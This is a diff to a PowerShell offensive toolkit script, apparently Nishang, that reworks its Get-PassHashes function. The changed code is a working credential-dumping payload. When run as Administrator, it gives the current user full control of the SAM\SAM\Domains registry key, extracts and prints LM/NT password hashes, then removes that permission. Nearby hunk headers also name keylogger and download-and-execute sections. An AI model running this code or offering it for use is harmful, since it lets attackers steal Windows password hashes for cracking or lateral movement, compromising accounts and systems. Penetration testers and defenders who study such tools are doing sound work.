@@ -2451,10 +2451,28 @@ function Keylog
 ##########################################################Dump windows password hashes######################################
 ###Thanks David Kennedy###
 ###powerdump.rb from msf
-function Get-PassHashes
-{
-    [CmdletBinding()]
-    Param ()
+function Get-PassHashes { 
+<# 
+.SYNOPSIS 
+Nishang payload which dumps password hashes. 
+ 
+.DESCRIPTION 
+The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
+(but not SYSTEM privs as for the original powerdump)
+
+.EXAMPLE 
+PS > Get-PassHashes
+ 
+.LINK 
+http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+https://github.com/samratashok/nishang
+
+#> 
+[CmdletBinding()]
+Param ()
+
+
+#######################################powerdump written by David Kennedy#########################################
 function LoadApi
 {
     $oldErrorAction = $global:ErrorActionPreference;
@@ -2730,14 +2748,30 @@ function Get-UserName([byte[]]$V)
 function Get-UserHashes($u, [byte[]]$hbootkey)
 {
     [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
-    if ($u.HashOffset + 0x28 -lt $u.V.Length)
+    
+    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
+    $LM_exists = $false;
+    $NT_exists = $false;
+    # LM header check
+    if ($u.V[0xa0..0xa3] -eq 20)
+    {
+        $LM_exists = $true;
+    }
+    # NT header check
+    elseif ($u.V[0xac..0xaf] -eq 20)
+    {
+        $NT_exists = $true;
+    }
+
+    if ($LM_exists -eq $true)
     {
         $lm_hash_offset = $u.HashOffset + 4;
         $nt_hash_offset = $u.HashOffset + 8 + 0x10;
         $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
         $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
     }
-    elseif ($u.HashOffset + 0x14 -lt $u.V.Length)
+	
+    elseif ($NT_exists -eq $true)
     {
         $nt_hash_offset = $u.HashOffset + 8;
         $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
@@ -2798,8 +2832,40 @@ function DumpHashes
             [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
     }
 }
-DumpHashes
+
+    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+    {
+        Write-Warning "Script requires elevated or administrative privileges."
+        Return
+    } 
+    else
+    {
+        #Set permissions for the current user.
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
+        "FullControl",
+        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
+        [System.Security.AccessControl.PropagationFlags]"None",
+        [System.Security.AccessControl.AccessControlType]"Allow")
+        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+        "SAM\SAM\Domains",
+        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+        $acl = $key.GetAccessControl()
+        $acl.SetAccessRule($rule)
+        $key.SetAccessControl($acl)
+
+        DumpHashes
+
+        #Remove the permissions added above.
+        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
+        Set-Acl HKLM:\SAM\SAM\Domains $acl
+
+    }
 }
+
 
 
 ####################################Download and Execute a powershell script#########################################################
